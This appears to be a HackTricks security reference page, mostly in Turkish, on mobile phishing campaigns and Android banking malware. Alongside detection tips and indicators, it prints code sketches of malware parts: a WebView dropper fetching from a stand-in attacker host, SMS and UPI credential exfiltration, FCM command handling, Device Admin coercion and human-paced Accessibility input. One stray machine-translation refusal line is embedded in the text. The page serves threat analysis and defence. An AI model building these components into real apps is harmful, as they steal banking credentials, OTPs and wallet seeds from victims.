# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Bu sayfa, tehdit aktörlerinin phishing (SEO, sosyal mühendislik, sahte mağazalar, dating uygulamaları vb.) yoluyla **malicious Android APKs** ve **iOS mobile-configuration profiles** dağıtmak için kullandıkları teknikleri kapsar.
> İçerik, Zimperium zLabs tarafından ortaya çıkarılan SarangTrap kampanyasından (2025) ve diğer açık araştırmalardan uyarlanmıştır.

## Saldırı Akışı

1. **SEO/Phishing Infrastructure**
* Onlarca benzer domain kaydedin (dating, cloud share, car service…).
– Google'da sıralama elde etmek için `<title>` öğesinde yerel dil anahtar kelimeleri ve emoji kullanın.
– Hem Android (`.apk`) hem de iOS kurulum talimatlarını aynı açılış sayfasında barındırın.
2. **First Stage Download**
* Android: imzasız veya “third-party store” APK'ye doğrudan link.
* iOS: `itms-services://` veya düz HTTPS link ile kötü amaçlı **mobileconfig** profile (aşağıya bakın).
3. **Post-install Social Engineering**
* İlk çalıştırmada uygulama bir **invitation / verification code** (özel erişim yanılsaması) ister.
* Kod **HTTP üzerinden POST edilir** Command-and-Control (C2)'ye.
* C2 `{"success":true}` yanıtını verirse ➜ malware devam eder.
* Geçerli bir kod göndermeyen Sandbox / AV dynamic analysis, herhangi bir kötü amaçlı davranış görmez (evasion).
4. **Runtime Permission Abuse** (Android)
* Tehlikeli izinler yalnızca C2'nin olumlu yanıtından sonra istenir:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Yeni varyantlar `AndroidManifest.xml` içinden SMS için `<uses-permission>` öğesini kaldırır ama Java/Kotlin kod yolunu, reflection ile SMS okuyan kısmı, bırakır ⇒ statik değerlendirme puanını düşürürken `AppOps` suiistimaliyle veya eski hedeflerde izin verildiğinde cihazlarda hâlâ çalışır.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13, sideloaded uygulamalar için **Restricted settings** getirdi: Accessibility ve Notification Listener anahtarları **App info**'da kullanıcı açıkça restricted settings'e izin verene kadar gri (devre dışı) görünür.
* Phishing sayfaları ve droper'lar artık sideload edilen uygulama için **allow restricted settings** adımlarını gösteren UI talimatları sağlar ve ardından Accessibility/Notification erişimini etkinleştirir.
* Daha yeni bir bypass, yükü **session‑based PackageInstaller flow** ile yüklemektir (uygulama mağazalarının kullandığı aynı yöntem). Android uygulamayı mağaza-yüklü olarak değerlendirir, bu yüzden Restricted settings artık Accessibility'i engellemez.
* Triage ipucu: bir dropper içinde `PackageInstaller.createSession/openSession` için grep yapın ve kurbanı hemen `ACTION_ACCESSIBILITY_SETTINGS` veya `ACTION_NOTIFICATION_LISTENER_SETTINGS`'e yönlendiren kodu arayın.

6. **Facade UI & Background Collection**
* Uygulama, yerel olarak uygulanmış zararsız görünümler (SMS viewer, gallery picker) gösterir.
* Bu sırada şu verileri sızdırır:
- IMEI / IMSI, telefon numarası
- Tam `ContactsContract` dökümü (JSON array)
- `/sdcard/DCIM` içindeki JPEG/PNG'ler, boyutu azaltmak için [Luban](https://github.com/Curzibn/Luban) ile sıkıştırılır
- İsteğe bağlı SMS içeriği (`content://sms`)
Yükler **batch-zipped** edilip `HTTP POST /upload.php` ile gönderilir.
7. **iOS Delivery Technique**
* Tek bir **mobile-configuration profile** `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` vb. isteyerek cihazı “MDM” benzeri denetime kaydettirebilir.
* Sosyal mühendislik talimatları:
1. Settings'i açın ➜ *Profile downloaded*.
2. *Install* üzerine üç kez dokunun (phishing sayfasında ekran görüntüleri).
3. İmzalanmamış profile Trust verin ➜ saldırgan, App Store incelemesi olmadan *Contacts* ve *Photo* yetkisini elde eder.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payload'ları, markalı bir simge/etiketle phishing URL'sini Ana Ekrana sabitleyebilir.
* Web Clips **tam ekran** çalışabilir (tarayıcı UI'sini gizler) ve **non‑removable** olarak işaretlenebilir; kullanıcı simgeyi kaldırmak için profili silmek zorunda kalır.
9. **Network Layer**
* Düz HTTP, genelde 80 numaralı portta ve HOST başlığı `api.<phishingdomain>.com` gibi olur.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → kolayca fark edilir).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Malware değerlendirmesi sırasında invitation code aşamasını Frida/Objection ile otomatikleştirerek kötü niyetli dala ulaşın.
* **Manifest vs. Runtime Diff** – `aapt dump permissions` ile runtime `PackageManager#getRequestedPermissions()`'ı karşılaştırın; tehlikeli izinlerin manifestte görünmemesi bir uyarı işaretidir.
* **Network Canary** – Kod girişinden sonra kontrolsüz POST patlamalarını tespit etmek için `iptables -p tcp --dport 80 -j NFQUEUE` yapılandırın.
* **mobileconfig Inspection** – macOS'ta `security cms -D -i profile.mobileconfig` kullanarak `PayloadContent` listesini çıkarın ve aşırı yetkileri tespit edin.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Göstergeler (Genel)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Bu desen, devlet-yardımı temalarını kötüye kullanan kampanyalarda Hindistan UPI kimlik bilgileri ve OTP'leri çalmak için gözlemlendi. Operatörler teslimat ve dayanıklılık için güvenilir platformları zincir halinde kullanıyor.

### Delivery chain across trusted platforms
- YouTube video yemi → açıklamada kısa bir link bulunur
- Kısa link → GitHub Pages üzerinde meşru portalı taklit eden bir phishing sitesi
- Aynı GitHub repo, dosyaya doğrudan bağlanan sahte bir “Google Play” rozetiyle bir APK barındırır
- Dinamik phishing sayfaları Replit'te barınır; uzaktan komut kanalı Firebase Cloud Messaging (FCM) kullanır

### Dropper with embedded payload and offline install
- İlk APK, gerçek malware'i `assets/app.apk` içinde taşıyan bir installer (dropper) olup, kullanıcıyı bulut tespitini zayıflatmak için Wi‑Fi/mobil veriyi kapatmaya yönlendirir.
- Gömülü payload, “Secure Update” gibi önemsiz bir ad altında kurulur. Kurulumdan sonra hem installer hem payload ayrı uygulamalar olarak mevcut olur.

Statik triage ipucu (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### shortlink ile dinamik endpoint keşfi
- Malware, bir shortlink'ten düz metin, virgülle ayrılmış aktif endpoint listesini çeker; basit string dönüşümleri nihai phishing sayfa yolunu üretir.

Örnek (sansürlenmiş):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Sözde kod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” adımı, WebView içinde dinamik endpoint'ten bir saldırgan HTML formu yükler ve hassas alanları (telefon, banka, UPI PIN) yakalayarak bunları `POST` ile `addup.php`'e gönderir.

Minimal yükleyici:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Agresif izinler ilk çalıştırmada istenir:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kişiler döngüye alınarak mağdurun cihazından smishing SMS'leri toplu olarak gönderilir.
- Gelen SMS'ler bir broadcast receiver tarafından yakalanır ve metadata (gönderen, içerik, SIM yuvası, her cihaza özgü rastgele ID) ile `/addsm.php`'ye yüklenir.

Alıcı taslağı:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) dayanıklı bir C2 olarak
- payload, FCM'ye kayıt olur; push mesajları, eylemleri tetiklemek için bir anahtar olarak kullanılan `_type` alanını taşır (ör. phishing metin şablonlarını güncelleme, davranışları açıp kapama).

Örnek FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler taslağı:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Göstergeler/IOCs
- APK, ikincil payload'ı `assets/app.apk` içinde barındırır
- WebView, ödemeyi `gate.htm`'den yükler ve verileri exfiltrate eder `/addup.php`'e
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (örn., `rebrand.ly/*`) CSV endpoint'leri döndürür
- Uygulamalar genel olarak “Update/Secure Update” olarak etiketlenmiş
- Güvenilmeyen uygulamalarda `_type` ayrıştırıcısına sahip FCM `data` mesajları

---

## Socket.IO/WebSocket tabanlı APK Smuggling + Sahte Google Play Pages

Saldırganlar statik APK linklerini giderek daha sık Google Play görünümlü lure'lara gömülü bir Socket.IO/WebSocket kanalıyla değiştiriyor. Bu, payload URL'sini gizler, URL/extension filtrelerini atlatır ve gerçekçi bir install UX korur.

Gerçek dünyada gözlemlenen tipik istemci akışı:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Neden basit kontrolleri atlatıyor:
- Statik bir APK URL'si açığa çıkarılmaz; payload bellekte WebSocket framelerinden yeniden oluşturulur.
- Doğrudan .apk yanıtlarını engelleyen URL/MIME/extension filtreleri, WebSockets/Socket.IO üzerinden tünellenen ikili veriyi kaçırabilir.
- WebSockets'i çalıştırmayan Crawlers ve URL sandboxes payload'ı elde edemez.

Ayrıca bakınız: WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay ve Device Admin Abuse, ATS otomasyonu ve NFC relay orkestrasyonu – RatOn vaka çalışması

RatOn banker/RAT kampanyası (ThreatFabric), modern mobil phishing operasyonlarının WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover ve hatta NFC-relay orkestrasyonunu nasıl harmanladığının somut bir örneğidir. Bu bölüm yeniden kullanılabilir teknikleri soyutlar.

### Aşama-1: WebView → native install bridge (dropper)
Saldırganlar, saldırgan bir sayfaya işaret eden bir WebView gösterir ve native bir installer'ı ortaya çıkaran bir JavaScript arayüzü enjekte eder. Bir HTML butonuna dokunuş, dropper'ın assets'inde paketlenmiş ikinci aşama APK'yı kuran native koda çağrı yapar ve ardından onu doğrudan başlatır.

Minimal örnek:

<details>
<summary>Aşama-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
I don't see the content to translate. Please paste the markdown/HTML from src/generic-methodologies-and-resources/phishing-methodology/mobile-phishing-malicious-apps.md (or the HTML on the page) and I'll translate it to Turkish.
```html
<button onclick="bridge.installApk()">Install</button>
```
Yüklemeden sonra, dropper açıkça belirtilen paket/aktivite üzerinden payload'u başlatır:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.

### Onay hunisi: Accessibility + Device Admin + takip eden runtime istemleri
Stage-2 bir WebView açar ve içinde “Access” adlı bir sayfa barındırır. Sayfadaki buton, kurbanı Accessibility ayarlarına yönlendiren ve rogue servisin etkinleştirilmesini isteyen exported bir metodu çağırır. Onay verildikten sonra, malware Accessibility'yi kullanarak sonraki çalışma zamanı izin diyaloglarını (contacts, overlay, manage system settings, vb.) otomatik olarak tıklayıp geçer ve Device Admin ister.

- Accessibility, node-tree içinde “Allow”/“OK” gibi düğümleri bularak ve tıklama olayları göndererek sonraki istemleri programlı olarak kabul etmeye yardımcı olur.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView üzerinden overlay phishing/fidye
Operatörler komut verebilir:
- bir URL'den tam ekran overlay render etmek, veya
- inline HTML geçirip bir WebView overlay içinde yüklemek.

Muhtemel kullanım: zorlama (PIN girişi), cüzdan açtırıp PIN'leri yakalama, fidye mesajlaşması. Eksikse overlay izninin verildiğinden emin olmak için bir komut bulundurun.

### Uzak kontrol modeli – metin pseudo-screen + screen-cast
- Düşük bant genişliği: periyodik olarak Accessibility node tree'yi dump edin, görünen metinleri/rolleri/bounds serileştirip pseudo-screen olarak C2'ye gönderin (tek seferlik `txt_screen` ve sürekli `screen_live` gibi komutlar).
- Yüksek doğruluk: MediaProjection isteyip talep üzerine screen-casting/recording başlatın ( `display` / `record` gibi komutlar).

### ATS playbook (bank app automation)
Bir JSON görev verildiğinde, banka uygulamasını açın, Accessibility üzerinden metin sorguları ile koordinat tıklamalarının karışımıyla UI'yı yönlendirin ve istendiğinde mağdurun ödeme PIN'ini girin.

Örnek görev:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "Yeni ödeme"
- "Zadat platbu" → "Ödeme gir"
- "Nový příjemce" → "Yeni alıcı"
- "Domácí číslo účtu" → "Yurt içi hesap numarası"
- "Další" → "İleri"
- "Odeslat" → "Gönder"
- "Ano, pokračovat" → "Evet, devam et"
- "Zaplatit" → "Öde"
- "Hotovo" → "Tamam"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Kripto cüzdanı seed ifadesi çıkarma
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: kilidi aç (çalınan PIN veya sağlanan şifre), Güvenlik/Kurtarma bölümüne git, seed phrase'i göster/ortaya çıkar, keylog ile kaydet ve dışarı aktar. Farklı diller arasında gezinmeyi stabil hale getirmek için lokale duyarlı seçiciler (EN/RU/CZ/SK) uygulayın.

### Device Admin zorlaması
Device Admin API'leri, PIN yakalama fırsatlarını artırmak ve mağduru zorlamak için kullanılır:

- Anında kilitleme:
```java
dpm.lockNow();
```
- Mevcut kimlik bilgilerini süresi sona erecek şekilde ayarlayarak değişiklik yapmaya zorlayın (Erişilebilirlik yeni PIN/parolayı yakalar):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard biyometrik özelliklerini devre dışı bırakarak biyometrik olmayan kilit açmayı zorlayın:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Not: Birçok DevicePolicyManager kontrolü güncel Android'de Device Owner/Profile Owner gerektirir; bazı OEM yapıları gevşek olabilir. Hedef OS/OEM üzerinde her zaman doğrulayın.

### NFC relay orchestration (NFSkate)
Aşama-3, harici bir NFC-relay modülünü (ör. NFSkate) yükleyip başlatabilir ve hatta röle sırasında mağduru yönlendirmesi için bir HTML şablonu verebilir. Bu, çevrimiçi ATS ile birlikte temassız card-present nakit çekimini mümkün kılar.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operatör komut seti (örnek)
- UI/durum: `txt_screen`, `screen_live`, `display`, `record`
- Sosyal: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Cüzdanlar: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Cihaz: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- İletişim/Keşif: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Erişilebilirlik-tabanlı ATS tespit-önleme: insan-benzeri metin temposu ve çift metin enjeksiyonu (Herodotus)

Tehdit aktörleri giderek Erişilebilirlik-tabanlı otomasyonu, temel davranış biyometriklerine karşı ayarlanmış tespit-önleme ile harmanlıyor. Yakın zamanda ortaya çıkan bir banker/RAT, iki tamamlayıcı metin iletim modu ve rastgeleleştirilmiş tempo ile insan yazmasını simüle eden bir operatör anahtarı gösteriyor.

- Keşif modu: görünür node'ları selector'lar ve bounds ile sıralayarak girişleri hassas şekilde hedefleyin (ID, text, contentDescription, hint, bounds) ve sonra işlem yapın.
- Çift metin enjeksiyonu:
- Mod 1 – `ACTION_SET_TEXT` doğrudan hedef node üzerinde (kararlı, klavye yok);
- Mod 2 – clipboard set + `ACTION_PASTE` odaklanmış node içine (doğrudan setText engellendiğinde çalışır).
- İnsan-benzeri tempo: operatörün sağladığı string'i bölün ve olaylar arasında rastgeleleştirilmiş 300–3000 ms gecikmelerle karakter-bazlı iletin; böylece “makine-hızı yazma” heuristiklerinden kaçınılır. Bu, ya değeri kademeli olarak `ACTION_SET_TEXT` ile büyüterek ya da her seferinde bir karakter yapıştırarak uygulanır.

<details>
<summary>Java taslağı: node keşfi + setText veya clipboard+paste ile gecikmeli karakter-bazlı giriş</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Dolandırıcılık gizleme amaçlı overlay'lar:
- Operatör tarafından kontrol edilen opaklığa sahip tam ekran `TYPE_ACCESSIBILITY_OVERLAY` render edin; altındaki uzak otomasyon devam ederken mağdur için opak tutun.
- Tipik olarak sunulan komutlar: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Ayarlanabilir alfa ile minimal overlay:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Sık görülen operatör kontrol primitifleri: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (ekran paylaşımı).

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
